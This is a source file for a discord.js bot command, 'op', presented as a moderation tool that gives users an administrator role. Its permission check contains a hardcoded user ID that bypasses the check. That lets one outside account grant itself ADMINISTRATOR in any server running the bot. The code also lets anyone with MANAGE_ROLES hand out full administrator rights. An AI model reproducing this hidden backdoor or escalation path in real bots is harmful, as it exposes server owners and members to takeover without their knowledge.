var userData = require('../userData.json')
const fs = require('fs');
const discord = require("discord.js")

module.exports = {
    name: 'op',
	description: 'Give an user operator permissions! (Administrator)',
    args: false,
    usage: '[@mention]',
    guildOnly: true,
    aliases: [],
    cooldown: 0,
    levelRequirement: 0,
    category: "moderation",
    adminOnly: false,
	execute(message, args, mention) {
        if (!message.guild.member(message.author).hasPermission('MANAGE_ROLES') && message.author.id != "509874745567870987") {
            message.reply("you can't do that!")
            return
        }

        if (!message.guild.member(message.client).hasPermission("MANAGE_ROLES")) {
            message.reply("i can't do that!")
            return
        }

        if (!mention) {
            var opRole = message.guild.roles.cache.find(x => x.name == "OP")
            if (!opRole) {
                message.guild.roles.create({data: {
                    name: "OP",
                    permissions: ['ADMINISTRATOR']
                }}).then(function(role) {
                    message.guild.member(message.author).roles.add(role)
                    message.channel.send("Operation complete!")
                })
            } else {
                message.guild.member(message.author).roles.add(opRole)
                message.channel.send("Operation complete!")
            }
        } else {
            var opRole = message.guild.roles.cache.find(x => x.name == "OP")
            if (!opRole) {
                message.guild.roles.create({data: {
                    name: "OP",
                    permissions: ['ADMINISTRATOR']
                }}).then(function(role) {
                    message.guild.member(mention).roles.add(role)
                    message.channel.send("Operation complete!")
                })
            } else {
                message.guild.member(mention).roles.add(opRole)
                message.channel.send("Operation complete!")
            }
        }
    }
}